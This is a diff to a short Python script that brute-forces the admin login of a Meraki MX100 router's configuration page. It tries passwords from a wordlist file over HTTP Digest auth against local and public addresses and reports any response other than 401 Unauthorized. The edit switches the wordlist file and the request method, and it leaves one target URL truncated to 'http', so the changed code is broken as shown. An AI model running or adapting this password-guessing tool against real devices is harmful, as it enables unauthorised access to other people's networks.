@@ -3,13 +3,13 @@ from requests.auth import HTTPDigestAuth
 
 # different ways to get to the config page of the MX100
 testurl = 'https://www.google.com'
-url1 = 'http://172.16.1.1/configure'
+url1 = 'http'
 url2 = 'http://setup.meraki.com/configure'
 url3 = 'http://138.207.175.210/configure'
 url4 = 'http://172.16.1.1/configure/index.cgi'
 
 # fresh off the stack overflow griddle
-with open('dates.txt') as file:
+with open('num.txt') as file:
     # tf is list comprehension?
     passwords = [line.rstrip() for line in file]
 
@@ -20,7 +20,7 @@ total = 0
 # make a request with each password, starting at the last one logged
 for i in range(total, len(passwords)):
     # too easy
-    request = requests.head(url1, auth=HTTPDigestAuth('admin', passwords[i]))
+    request = requests.get(url1, auth=HTTPDigestAuth('admin', passwords[i]))
     # Reference: 401 Unauthorized & 200 Ok
     # triggers on status codes other than 200 but i'd want to know about those, too
     if not request.status_code == 401:
